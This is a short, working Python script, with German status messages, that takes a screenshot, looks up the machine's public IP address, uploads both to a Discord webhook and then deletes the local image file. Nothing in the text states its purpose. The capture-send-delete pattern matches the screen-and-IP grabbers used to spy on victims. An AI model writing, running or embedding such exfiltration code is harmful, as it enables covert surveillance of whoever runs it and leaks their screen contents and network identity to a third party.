import pyautogui
import os
import tempfile
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

def take_screenshot():
    screenshot = pyautogui.screenshot()

    temp_dir = tempfile.gettempdir()
    screenshot_path = os.path.join(temp_dir, "screenshot.png")
    screenshot.save(screenshot_path)

    return screenshot_path

def get_public_ip():
    response = requests.get('https://api.ipify.org/?format=json')
    ip_data = response.json()
    public_ip = ip_data['ip']
    return public_ip

def send_to_discord(webhook_url, screenshot_path, public_ip):
    webhook = DiscordWebhook(url=webhook_url)

    with open(screenshot_path, "rb") as file:
        webhook.add_file(file=file.read(), filename='screenshot.png')

    embed = DiscordEmbed(title='Screenshot mit öffentlicher IP-Adresse', description=f'Die öffentliche IP-Adresse lautet: {public_ip}', color=242424)
    
    webhook.add_embed(embed)

    response = webhook.execute()

    print("Screenshot und Embed mit öffentlicher IP-Adresse erfolgreich an Discord gesendet!")

    os.remove(screenshot_path)
    print("Screenshot erfolgreich gelöscht!")

if __name__ == "__main__":
    webhook_url = 'your_url'

    screenshot_path = take_screenshot()

    public_ip = get_public_ip()

    send_to_discord(webhook_url, screenshot_path, public_ip)
